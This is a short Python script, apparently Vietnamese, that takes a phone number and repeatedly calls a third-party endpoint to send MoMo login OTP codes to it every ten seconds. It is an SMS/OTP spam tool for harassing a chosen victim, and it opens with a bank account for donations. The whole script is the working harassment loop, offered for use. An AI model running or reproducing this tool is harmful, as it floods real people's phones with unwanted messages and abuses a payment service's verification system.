import requests, time
from time import sleep
print ("------Information Donate------")
print ("MBBANK: 999991497")
print ("------------------------------")
print ("")
phone = input("Input phone: ")
while True:
   main = requests.get("https://danganhduy.io/login-momo.php?phone="+str(phone)).json()
   if main == 0:
       print ("Spam so nay an lon a?")
       sleep(5)
       break
   else:
       print ("SEND OTP SUCCESS: "+phone)
       sleep(10)
       
